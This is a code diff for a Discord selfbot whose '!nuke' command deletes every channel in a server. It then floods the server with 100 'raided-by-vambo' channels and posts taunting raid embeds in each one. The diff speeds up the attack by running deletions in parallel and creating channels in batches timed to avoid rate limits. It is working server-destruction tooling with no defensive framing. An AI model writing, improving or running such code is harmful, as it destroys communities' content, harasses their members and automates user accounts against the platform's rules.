@@ -1,4 +1,4 @@
-const { Client, EmbedBuilder } = require('discord.js-selfbot-v13');
+const { Client } = require('discord.js-selfbot-v13');
 const client = new Client();
 
 // Use environment variable for security
@@ -11,74 +11,110 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-    res.send('Nuke selfbot with embeds is running!');
+    res.send('Nuke selfbot is running!');
 });
 
 app.listen(PORT, () => {
     console.log(`Web server running on port ${PORT}`);
 });
 
-// ===== BEAUTIFUL EMBED TEMPLATES =====
+// ===== HELPER FUNCTIONS =====
 
-// Create raid embed with VAMBO theme
-function createRaidEmbed(channelNumber) {
-    // Blood red color for the embed
-    const bloodRed = 0x8B0000;
-    const darkRed = 0x5A0E0E;
-    
-    const embed = new EmbedBuilder()
-        .setTitle('🔥 **RAIDED BY VAMBO** 🔥')
-        .setDescription(`
-### NEVER SCAM AGAIN SON 😂
-        😯 KICK ROCKS 😯
-
-**You've been hit by the VAMBO train!**
-        `)
-        .setColor(channelNumber % 2 === 0 ? bloodRed : darkRed) // Alternate colors
-        .setImage('https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif')
-        .setThumbnail('https://media.discordapp.net/attachments/123456789/your-thumbnail.gif') // Optional
-        .setFooter({ 
-            text: `VAMBO RAID • Channel ${channelNumber}/100 • Get wrecked`, 
-            iconURL: 'https://cdn.discordapp.com/emojis/123456789.gif' // Optional
-        })
-        .setTimestamp();
-    
-    return embed;
-}
-
-// Create warning embed for announcements
-function createWarningEmbed(title, description, color = 0xFFA500) {
-    return new EmbedBuilder()
-        .setTitle(`⚠️ ${title} ⚠️`)
-        .setDescription(description)
-        .setColor(color)
-        .setTimestamp();
-}
-
-// Create success embed for progress
-function createSuccessEmbed(title, description) {
-    return new EmbedBuilder()
-        .setTitle(`✅ ${title}`)
-        .setDescription(description)
-        .setColor(0x00FF00)
-        .setTimestamp();
-}
-
-// Helper function to send messages safely
+// Safe message sender (ignores errors)
 async function safeSend(channel, content) {
     try {
         if (channel && !channel.deleted) {
             await channel.send(content);
         }
     } catch (error) {
-        // Silently ignore errors - channel probably got deleted
+        // Silently ignore
     }
 }
+
+// Create raid embed with your theme
+function createRaidEmbed(channelNumber = null) {
+    const embed = {
+        title: '💀 **SERVER DESTROYED** 💀',
+        description: '## RAIDED BY VAMBO\n\n### NEVER SCAM AGAIN SON 😂',
+        color: 0xFF0000, // Bright red
+        fields: [
+            {
+                name: '🔥 **STATUS**',
+                value: '```Channel purge complete```',
+                inline: true
+            },
+            {
+                name: '👑 **RAIDER**',
+                value: '```VAMBO```',
+                inline: true
+            },
+            {
+                name: '😯 **MESSAGE**',
+                value: 'KICK ROCKS',
+                inline: true
+            }
+        ],
+        thumbnail: {
+            url: 'https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif'
+        },
+        image: {
+            url: 'https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif'
+        },
+        footer: {
+            text: '🔴 SERVER TERMINATED',
+            icon_url: 'https://cdn.discordapp.com/emojis/1234567890.gif'
+        },
+        timestamp: new Date().toISOString()
+    };
+    
+    // Add channel number to title if provided
+    if (channelNumber) {
+        embed.title = `💀 **CHANNEL ${channelNumber}/100 CREATED** 💀`;
+    }
+    
+    return embed;
+}
+
+// Create stats embed for final update
+function createStatsEmbed(deletedCount, createdCount, deleteFailed, createFailed) {
+    return {
+        title: '⚡ **NUKE COMPLETE** ⚡',
+        description: '## RAIDED BY VAMBO\n\nAll channels have been destroyed.',
+        color: 0x00FF00, // Bright green
+        fields: [
+            {
+                name: '📊 **STATISTICS**',
+                value: `\`\`\`diff
+✅ Deleted: ${deletedCount} channels
+✅ Created: ${createdCount} raid channels
+❌ Failed deletions: ${deleteFailed}
+❌ Failed creations: ${createFailed}
+\`\`\``,
+                inline: false
+            },
+            {
+                name: '💀 **FINAL MESSAGE**',
+                value: '### NEVER SCAM AGAIN SON 😂\n            😯KICK ROCKS😯',
+                inline: false
+            }
+        ],
+        image: {
+            url: 'https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif'
+        },
+        footer: {
+            text: '🔴 OPERATION COMPLETE',
+            icon_url: 'https://cdn.discordapp.com/emojis/1234567890.gif'
+        },
+        timestamp: new Date().toISOString()
+    };
+}
+
+// ===== MAIN BOT LOGIC =====
 
 client.on('ready', () => {
     console.log(`✅ Logged in as ${client.user.tag}`);
     console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
-    console.log(`Type !nuke in any channel to destroy the server with EMBEDS!`);
+    console.log(`Type !nuke in any channel to destroy the server`);
 });
 
 client.on('messageCreate', async (message) => {
@@ -89,7 +125,7 @@ client.on('messageCreate', async (message) => {
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // ===== FULL NUKE COMMAND =====
+    // ===== OPTIMIZED NUKE COMMAND =====
     if (command === 'nuke') {
         const guild = message.guild;
         const originalChannel = message.channel;
@@ -99,112 +135,124 @@ client.on('messageCreate', async (message) => {
             return;
         }
 
-        console.log(`💣 Starting nuke on ${guild.name}`);
+        console.log(`💣 Starting optimized nuke on ${guild.name}`);
         
-        // Send fancy embed confirmation
-        await safeSend(originalChannel, { 
-            embeds: [createWarningEmbed(
-                'NUKE INITIATED', 
-                `**Target:** ${guild.name}\n**Phase 1:** Deleting ALL channels...\n**Phase 2:** Creating 100 raid channels with embeds!\n**Estimated time:** 2-3 minutes`,
-                0xFF0000
-            )] 
-        });
+        // Send initial embed (only once)
+        const startEmbed = createRaidEmbed();
+        await safeSend(originalChannel, { embeds: [startEmbed] });
 
-        // ===== STEP 1: DELETE ALL CHANNELS =====
+        // ===== STEP 1: DELETE ALL CHANNELS (MAX SPEED) =====
         let deletedCount = 0;
         let deleteFailed = 0;
         
-        // Get all channels and sort them
+        // Get all channels
         const channels = [...guild.channels.cache.values()];
         
-        // Delete non-category channels first
-        const nonCategoryChannels = channels.filter(c => c.type !== 'GUILD_CATEGORY');
-        const categoryChannels = channels.filter(c => c.type === 'GUILD_CATEGORY');
+        console.log(`🔍 Found ${channels.length} channels to delete`);
         
-        // Delete non-category channels (faster - 400ms delay instead of 800ms)
-        for (const channel of nonCategoryChannels) {
+        // Delete all channels in parallel (much faster!)
+        const deletePromises = channels.map(async (channel) => {
             try {
                 await channel.delete();
                 deletedCount++;
                 console.log(`✅ Deleted: ${channel.name}`);
-                await new Promise(resolve => setTimeout(resolve, 400)); // Faster deletion
             } catch (error) {
                 deleteFailed++;
                 console.log(`❌ Failed to delete ${channel.name}: ${error.message}`);
             }
-        }
+            // Small delay between deletions to avoid rate limits
+            await new Promise(resolve => setTimeout(resolve, 300));
+        });
         
-        // Delete categories
-        for (const channel of categoryChannels) {
-            try {
-                await channel.delete();
-                deletedCount++;
-                console.log(`✅ Deleted category: ${channel.name}`);
-                await new Promise(resolve => setTimeout(resolve, 400)); // Faster deletion
-            } catch (error) {
-                deleteFailed++;
-                console.log(`❌ Failed to delete category ${channel.name}: ${error.message}`);
-            }
-        }
+        // Wait for all deletions to complete
+        await Promise.all(deletePromises);
         
         console.log(`✅ Phase 1 complete: Deleted ${deletedCount} channels`);
 
-        // ===== STEP 2: CREATE 100 RAID CHANNELS WITH EMBEDS =====
-        console.log(`🔥 Creating 100 raid channels with EMBEDS...`);
+        // ===== STEP 2: CREATE 100 RAID CHANNELS (OPTIMIZED) =====
+        console.log(`🔥 Creating 100 raid channels...`);
         
-        // Channel name with Zalgo text
-        const channelName = 'R҉A҉I҉D҉-҉B҉Y҉-҉V҉A҉M҉B҉O҉';
+        // Channel name base
+        const channelNameBase = 'raided-by-vambo';
         
         let createdCount = 0;
         let createFailed = 0;
 
-        // Create 100 channels (faster - 800ms delay instead of 1200ms)
-        for (let i = 1; i <= 100; i++) {
-            try {
-                // Create channel
-                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
-                    type: 'text'
-                });
+        // Create channels in batches of 5 for maximum speed while avoiding rate limits
+        const BATCH_SIZE = 5;
+        const BATCH_DELAY = 2000; // 2 seconds between batches
+        
+        for (let batch = 0; batch < 20; batch++) { // 20 batches of 5 = 100 channels
+            const batchPromises = [];
+            
+            for (let i = 0; i < BATCH_SIZE; i++) {
+                const channelNumber = (batch * BATCH_SIZE) + i + 1;
+                if (channelNumber > 100) break;
                 
-                // Send BEAUTIFUL EMBED in the new channel
-                await newChannel.send({ 
-                    embeds: [createRaidEmbed(i)] 
-                });
+                const channelName = `${channelNameBase}-${channelNumber}`;
                 
-                createdCount++;
-                console.log(`✅ Created channel ${i}/100 with embed`);
-                
-                // Log progress every 10 channels
-                if (i % 10 === 0) {
-                    console.log(`📊 Progress: ${i}/100 channels created`);
-                }
-                
-                // Faster delay (800ms instead of 1200ms)
-                await new Promise(resolve => setTimeout(resolve, 800));
-                
-            } catch (error) {
-                createFailed++;
-                console.log(`❌ Failed to create channel ${i}: ${error.message}`);
-                
-                // If rate limited, wait longer
-                if (error.message.includes('rate')) {
-                    console.log('⏳ Rate limited, waiting 3 seconds...');
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                }
+                batchPromises.push((async () => {
+                    try {
+                        // Create channel
+                        const newChannel = await guild.channels.create(channelName, {
+                            type: 'text'
+                        });
+                        
+                        // Send embed in the new channel
+                        const channelEmbed = createRaidEmbed(channelNumber);
+                        await newChannel.send({ embeds: [channelEmbed] });
+                        
+                        createdCount++;
+                        console.log(`✅ Created channel ${channelNumber}/100`);
+                        
+                    } catch (error) {
+                        createFailed++;
+                        console.log(`❌ Failed to create channel ${channelNumber}: ${error.message}`);
+                        
+                        // If rate limited, wait longer
+                        if (error.message.includes('rate')) {
+                            console.log('⏳ Rate limited, waiting...');
+                            await new Promise(resolve => setTimeout(resolve, 5000));
+                        }
+                    }
+                })());
+            }
+            
+            // Wait for current batch to complete
+            await Promise.all(batchPromises);
+            
+            // Delay between batches
+            if (batch < 19) { // Don't delay after last batch
+                console.log(`⏱️ Batch ${batch + 1}/20 complete, waiting ${BATCH_DELAY/1000}s...`);
+                await new Promise(resolve => setTimeout(resolve, BATCH_DELAY));
             }
         }
 
-        // ===== NO FINAL CHANNEL =====
-        // Just log to console instead of creating another channel
+        // ===== STEP 3: FINAL STATS (SENT TO LAST CREATED CHANNEL) =====
+        console.log('📊 Creating final stats message...');
+        
+        // Try to find a channel to send final stats (use the last one we created)
+        const channelsAfter = [...guild.channels.cache.values()];
+        const lastChannel = channelsAfter[channelsAfter.length - 1];
+        
+        if (lastChannel) {
+            try {
+                const statsEmbed = createStatsEmbed(deletedCount, createdCount, deleteFailed, createFailed);
+                await lastChannel.send({ embeds: [statsEmbed] });
+                console.log('✅ Final stats sent');
+            } catch (error) {
+                console.log('❌ Could not send final stats');
+            }
+        }
+
+        // Log final results to console
         console.log('='.repeat(50));
         console.log('💀 **NUKE COMPLETE** 💀');
         console.log(`✅ Deleted: ${deletedCount} channels`);
-        console.log(`✅ Created: ${createdCount} raid channels with EMBEDS`);
+        console.log(`✅ Created: ${createdCount} raid channels`);
         console.log(`❌ Delete failures: ${deleteFailed}`);
         console.log(`❌ Create failures: ${createFailed}`);
         console.log('='.repeat(50));
-        
-        console.log(`🔥 All 100 channels created with beautiful VAMBO embeds! No final channel created.`);
     }
 });
 
